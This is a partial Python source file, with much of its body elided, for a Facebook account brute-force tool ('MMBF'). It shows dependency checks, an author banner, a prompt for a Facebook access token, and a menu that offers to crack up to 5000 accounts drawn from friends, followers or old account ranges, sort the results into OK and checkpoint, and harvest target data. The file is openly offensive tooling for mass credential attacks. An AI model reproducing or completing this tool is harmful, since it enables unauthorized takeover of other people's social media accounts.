#!/usr/bin/python3
# MMBF [Mantal MULTI BERUTE FORCE]
# Recode Hamza
# Versi 2.5
...
try:
	...
	os.system("clear")
	print("\n"+balmond+m+"Futures Module Not Installed, Run pip install futures")
	time.sleep(0.5)
	exit()
try:
	import requests
	...
	os.system("clear")
	print("\n"+balmond+m+" Module Requests Not Installed, Run pip install requests")
	time.sleep(0.5)
	exit()
try:
	import bs4
	...
	os.system("clear")
	print("\n"+balmond+m+" Bs4 Module Not Installed, Run pip install bs4")
	time.sleep(0.5)
	exit()
try:
	import mechanize
	...
	os.system("clear")
	print("\n"+balmond+m+" Mechanize Module Not Installed, Run pip install mechanize")
	time.sleep(0.5)
	exit()
...
/         /\____|__  / |@@@@@@@  / \@@  /   
                   \/         \/      \/    
\033[92;1m----------------------------------------------------------
\033[97;1m \033[92;1mCreator  \033[97;1m: \033[93;1mSanz-Tzy \033[97;1mX \033[93;1mMantal
\033[97;1m \033[92;1mWhatsApp \033[97;1m: \033[93;1m92301xxxxx
\033[97;1m \033[92;1mGithub   \033[97;1m: \033[93;1mHttps://github.com/xxx
\033[97;1m \033[92;1mFacebook \033[97;1m: \033[93;1mxxxx \033[97;1m[\033[92;1mFollow Me Facebook\033[97;1m]
\033[97;1m\033[92;1m Crack Facebook random will be like green tea
\033[97;1m\033[93;1m---------------------------------------------------------
""")
...
def login():
	clear()
	banner()
	token = input("\n"+balmond+l+" \33[1;93mEnter Facebook Token : \33[1;92m")
	try:
...
def menu():
	...
	print(u+line)
	print(s+"\n{"+m+"01"+s+"}"+l+" \33[1;97mCrack From \33[1;93mFriends Or Public "+u+"\33[1;93m[ \33[1;96mMAXS 5000\33[1;93m]")
	print(s+"{"+m+"02"+s+"}"+l+" \33[1;97mCrack From \33[1;93mFollowers Public "+u+"\33[1;93m[\33[1;96mMAXS 5000\33[1;93m]")
	print(s+"{"+m+"03"+s+"}"+l+" \33[1;97mCrack From \33[1;93mPublic Friends "+s+""+m+"\33[1;93m[\33[1;96mMAXS 5000\33[1;93m]"+s+"")
	print(s+"{"+m+"04"+s+"}"+l+" \33[1;97mCrack From \33[1;93mOld Account 04/08 "+s+""+m+"\33[1;93m[\33[1;96mMAXS 5000\33[1;93m]"+s+"")
	print(s+"{"+m+"05"+s+"}"+l+" \33[1;97mCrack From \33[1;93mOld Account 04/10 "+s+""+m+"\33[1;93m[\33[1;96mMAXS 5000\33[1;93m]"+s+"")
	print(s+"{"+m+"06"+s+"}"+l+" \33[1;97mSetting U/A \33[1;93m[\33[1;96mUser Agent\33[1;93m] ")
	print(s+"{"+m+"07"+s+"}"+l+" \33[1;97mCek Option \33[1;93mResults Crack "+s+"{ok/cp}")
	print(s+"{"+m+"08"+s+"}"+l+" \33[1;97mCek Result \33[1;93mCrack Account \33[1;96m[\33[1;92mOK\33[1;96m/\33[1;93mCP\33[1;96m]")
	print(s+"{"+m+"09"+s+"}"+l+" \33[1;97mInfo Author \33[1;93m[ \33[1;96mJindy ReALL Name Hamza \33[1;93m]")
	print(s+"{"+m+"10"+s+"}"+l+" \33[1;97mTutor Buka Sesi \33[1;93m[\33[1;96mByMantal\33[1;93m]")
	print(s+"{"+m+"11"+s+"}"+l+" \33[1;97mTake Data \33[1;93m[\33[1;96mTarget\33[1;93m]")
	...
	if sayangku=="1" or sayangku=="01":
		...
		jalan(balmond+l+" \33[1;93mThanks for using Ab mro use kro")
		time.sleep(0.5)
		exit()
	else:
		jalan("\n"+balmond+m+" \33[1;91mYour Choice Invalid")
		time.sleep(0.5)
		menu()
...
def GetData():
    ...
    try:
        ...
        if user == '':
            print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Enter correctly bro");GetData()
